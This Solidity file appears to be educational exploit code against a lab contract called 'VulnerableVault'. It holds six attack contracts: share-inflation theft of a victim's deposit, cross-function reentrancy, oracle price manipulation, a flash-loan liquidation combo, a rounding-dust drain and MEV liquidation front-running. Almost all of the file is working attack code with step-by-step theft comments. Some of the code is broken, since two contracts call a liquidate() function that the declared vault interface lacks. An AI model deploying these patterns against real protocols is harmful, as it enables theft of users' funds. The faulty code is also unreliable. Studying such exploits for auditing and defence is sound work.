// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Exploit Contracts for VulnerableVault
 * @notice These contracts demonstrate how to exploit the vulnerabilities
 * @dev FOR EDUCATIONAL PURPOSES ONLY
 */

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IVulnerableVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function withdraw(uint256 shares) external returns (uint256 assets);
    function borrow(uint256 amount) external;
    function repay(uint256 amount) external;
    function shareBalances(address user) external view returns (uint256);
    function asset() external view returns (address);
}

interface IOracle {
    function setPrice(address token, uint256 price) external;
    function getPrice(address token) external view returns (uint256);
}

/**
 * @title Exploit1_InflationAttack
 * @notice Exploits ERC-4626 inflation vulnerability
 * 
 * ATTACK STEPS:
 * 1. Deposit 1 wei to get 1 share
 * 2. Donate large amount (e.g., 10000 ether) directly to vault
 * 3. Now 1 share = 10000 ether + 1 wei
 * 4. Victim deposits 9999 ether
 * 5. Victim gets: (9999e18 * 1) / (10000e18 + 1) = 0 shares (rounds down!)
 * 6. Attacker withdraws 1 share, gets nearly 20000 ether
 * 
 * PROFIT: Victim's entire deposit
 */
contract Exploit1_InflationAttack {
    IVulnerableVault public vault;
    IERC20 public asset;
    
    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(vault.asset());
    }
    
    /**
     * @notice Execute the inflation attack
     * @param donationAmount Amount to donate to inflate share price
     */
    function attack(uint256 donationAmount) external {
        // Step 1: Deposit minimum amount to get first share
        asset.transferFrom(msg.sender, address(this), 1 + donationAmount);
        asset.approve(address(vault), type(uint256).max);
        
        // Get 1 share with 1 wei deposit
        vault.deposit(1);
        
        // Step 2: Donate large amount to vault directly
        // This inflates the value of our 1 share
        asset.transfer(address(vault), donationAmount);
        
        // Now when victim deposits, they get rounded down to 0 shares
        // We can withdraw and steal their funds
    }
    
    function withdrawAll() external {
        uint256 shares = vault.shareBalances(address(this));
        vault.withdraw(shares);
        
        // Transfer stolen funds to attacker
        uint256 balance = asset.balanceOf(address(this));
        asset.transfer(msg.sender, balance);
    }
}

/**
 * @title Exploit2_CrossFunctionReentrancy
 * @notice Exploits cross-function reentrancy between withdraw() and borrow()
 * 
 * ATTACK STEPS:
 * 1. Deposit collateral to vault
 * 2. Call withdraw() to withdraw shares
 * 3. During the transfer callback, call borrow()
 * 4. getCollateralValue() reads stale shareBalances (before decrement)
 * 5. Borrow based on inflated collateral value
 * 6. withdraw() completes, shares decremented
 * 7. Now undercollateralized but have borrowed funds
 * 
 * PROFIT: Borrowed funds exceed actual collateral value
 */
contract Exploit2_CrossFunctionReentrancy {
    IVulnerableVault public vault;
    IERC20 public asset;
    bool public attacking;
    uint256 public sharesToWithdraw;
    uint256 public amountToBorrow;
    
    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(vault.asset());
    }
    
    /**
     * @notice Setup and execute the attack
     * @param depositAmount Amount to deposit as collateral
     * @param _sharesToWithdraw Shares to withdraw (triggers reentrancy)
     * @param _amountToBorrow Amount to borrow during reentrancy
     */
    function attack(uint256 depositAmount, uint256 _sharesToWithdraw, uint256 _amountToBorrow) external {
        // Step 1: Deposit collateral
        asset.transferFrom(msg.sender, address(this), depositAmount);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(depositAmount);
        
        // Step 2: Setup reentrancy parameters
        sharesToWithdraw = _sharesToWithdraw;
        amountToBorrow = _amountToBorrow;
        attacking = true;
        
        // Step 3: Trigger reentrancy via withdraw
        vault.withdraw(_sharesToWithdraw);
        
        attacking = false;
        
        // Transfer stolen funds
        uint256 balance = asset.balanceOf(address(this));
        asset.transfer(msg.sender, balance);
    }
    
    /**
     * @notice Receive function is called during withdraw's transfer
     * @dev This is where we reenter via borrow()
     */
    receive() external payable {
        if (attacking && amountToBorrow > 0) {
            // REENTRANCY: During withdraw, call borrow
            // At this point, shareBalances not yet updated
            // So getCollateralValue returns inflated value
            vault.borrow(amountToBorrow);
            amountToBorrow = 0; // Prevent recursive reentrancy
        }
    }
    
    // Fallback for ERC20 transfers
    fallback() external payable {
        if (attacking && amountToBorrow > 0) {
            vault.borrow(amountToBorrow);
            amountToBorrow = 0;
        }
    }
}

/**
 * @title Exploit3_OracleManipulation
 * @notice Exploits oracle manipulation via flash loan
 * 
 * ATTACK STEPS:
 * 1. Take flash loan of large amount
 * 2. Manipulate oracle price upward (via DEX swap in real scenario)
 * 3. Deposit collateral at inflated price
 * 4. Borrow maximum based on manipulated price
 * 5. Let price return to normal (or manipulate downward)
 * 6. Position now undercollateralized
 * 7. Repay flash loan with profit
 * 
 * PROFIT: Borrowed funds exceed real collateral value
 */
contract Exploit3_OracleManipulation {
    IVulnerableVault public vault;
    IERC20 public asset;
    IOracle public oracle;
    
    uint256 public normalPrice;
    uint256 public manipulatedPrice;
    uint256 public collateralAmount;
    
    constructor(address _vault, address _oracle) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(vault.asset());
        oracle = IOracle(_oracle);
    }
    
    /**
     * @notice Execute oracle manipulation attack
     * @param _normalPrice Normal price of asset
     * @param _manipulatedPrice Manipulated price (higher)
     * @param _collateralAmount Amount of collateral to deposit
     */
    function attack(
        uint256 _normalPrice,
        uint256 _manipulatedPrice,
        uint256 _collateralAmount
    ) external {
        normalPrice = _normalPrice;
        manipulatedPrice = _manipulatedPrice;
        collateralAmount = _collateralAmount;
        
        // Get funds
        asset.transferFrom(msg.sender, address(this), collateralAmount);
        asset.approve(address(vault), type(uint256).max);
        
        // Step 1: Manipulate oracle price upward
        oracle.setPrice(address(asset), manipulatedPrice);
        
        // Step 2: Deposit collateral (valued at inflated price)
        vault.deposit(collateralAmount);
        
        // Step 3: Borrow maximum based on inflated collateral value
        // collateralValue = collateralAmount * manipulatedPrice
        // canBorrow = (collateralValue * 100) / 150
        uint256 borrowAmount = (collateralAmount * manipulatedPrice * 100) / (150 * 1e18);
        vault.borrow(borrowAmount);
        
        // Step 4: Return price to normal
        oracle.setPrice(address(asset), normalPrice);
        
        // Now position is undercollateralized but we have the borrowed funds
        // Transfer profit
        uint256 balance = asset.balanceOf(address(this));
        asset.transfer(msg.sender, balance);
    }
}

/**
 * @title Exploit4_FlashLoanCombo
 * @notice Combines flash loan with multiple attack vectors
 * 
 * COMPLEX MULTI-STEP ATTACK:
 * 1. Flash loan large amount
 * 2. Manipulate oracle price
 * 3. Deposit as collateral
 * 4. Borrow maximum
 * 5. Trigger liquidation of another user (MEV)
 * 6. Capture liquidation bonus
 * 7. Repay flash loan
 * 8. Keep profit
 * 
 * This demonstrates protocol composition risk and MEV extraction
 */
contract Exploit4_FlashLoanCombo {
    IVulnerableVault public vault;
    IERC20 public asset;
    IOracle public oracle;
    
    struct AttackParams {
        uint256 flashAmount;
        uint256 normalPrice;
        uint256 manipulatedPrice;
        address victimToLiquidate;
    }
    
    AttackParams public params;
    bool public inAttack;
    
    constructor(address _vault, address _oracle) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(vault.asset());
        oracle = IOracle(_oracle);
    }
    
    /**
     * @notice Execute complex multi-step attack
     */
    function attack(
        uint256 flashAmount,
        uint256 normalPrice,
        uint256 manipulatedPrice,
        address victimToLiquidate
    ) external {
        params = AttackParams({
            flashAmount: flashAmount,
            normalPrice: normalPrice,
            manipulatedPrice: manipulatedPrice,
            victimToLiquidate: victimToLiquidate
        });
        
        inAttack = true;
        
        // In real scenario, would call flash loan provider here
        // For demonstration, assume we have the funds
        
        executeAttack();
        
        inAttack = false;
    }
    
    function executeAttack() internal {
        // Step 1: Manipulate price upward
        oracle.setPrice(address(asset), params.manipulatedPrice);
        
        // Step 2: Deposit collateral
        asset.approve(address(vault), type(uint256).max);
        uint256 depositAmount = params.flashAmount / 2;
        vault.deposit(depositAmount);
        
        // Step 3: Borrow maximum
        uint256 borrowAmount = (depositAmount * params.manipulatedPrice * 100) / (150 * 1e18);
        vault.borrow(borrowAmount);
        
        // Step 4: Manipulate price downward to liquidate victim
        oracle.setPrice(address(asset), params.normalPrice / 2);
        
        // Step 5: Liquidate victim and capture bonus
        if (params.victimToLiquidate != address(0)) {
            vault.liquidate(params.victimToLiquidate);
        }
        
        // Step 6: Return price to normal
        oracle.setPrice(address(asset), params.normalPrice);
        
        // Flash loan repayment would happen here
        // Profit is kept
    }
}

/**
 * @title Exploit5_PrecisionLoss
 * @notice Exploits rounding errors through repeated small operations
 * 
 * ATTACK:
 * 1. Make many small deposits/withdrawals
 * 2. Each operation loses precision due to division
 * 3. Accumulate dust from rounding errors
 * 4. After many iterations, dust adds up to significant amount
 * 
 * This is a slow but steady drain attack
 */
contract Exploit5_PrecisionLoss {
    IVulnerableVault public vault;
    IERC20 public asset;
    
    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(vault.asset());
    }
    
    /**
     * @notice Execute precision loss attack through many small operations
     * @param iterations Number of deposit/withdraw cycles
     * @param amount Amount per cycle
     */
    function attack(uint256 iterations, uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount * iterations);
        asset.approve(address(vault), type(uint256).max);
        
        for (uint256 i = 0; i < iterations; i++) {
            // Deposit
            uint256 shares = vault.deposit(amount);
            
            // Immediately withdraw
            vault.withdraw(shares);
            
            // Due to rounding, we might get slightly more or less back
            // Over many iterations, this can add up
        }
        
        // Transfer any accumulated dust
        uint256 balance = asset.balanceOf(address(this));
        if (balance > 0) {
            asset.transfer(msg.sender, balance);
        }
    }
}

/**
 * @title Exploit6_MEVLiquidation
 * @notice Exploits predictable liquidations for MEV profit
 * 
 * MEV ATTACK:
 * 1. Monitor mempool for liquidatable positions
 * 2. When liquidation threshold crossed, frontrun with higher gas
 * 3. Capture 10% liquidation bonus
 * 4. No risk - fixed bonus guaranteed
 * 
 * This is a real MEV strategy used by searchers
 */
contract Exploit6_MEVLiquidation {
    IVulnerableVault public vault;
    IERC20 public asset;
    
    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
        asset = IERC20(vault.asset());
    }
    
    /**
     * @notice Frontrun liquidation for guaranteed profit
     * @param victim Address to liquidate
     * @dev In real scenario, would use flashbots to avoid being frontrun
     */
    function frontrunLiquidation(address victim) external {
        // Execute liquidation with high gas price
        vault.liquidate(victim);
        
        // Immediately withdraw shares for profit
        uint256 shares = vault.shareBalances(address(this));
        vault.withdraw(shares);
        
        // Transfer profit to MEV bot
        uint256 profit = asset.balanceOf(address(this));
        asset.transfer(msg.sender, profit);
    }
}
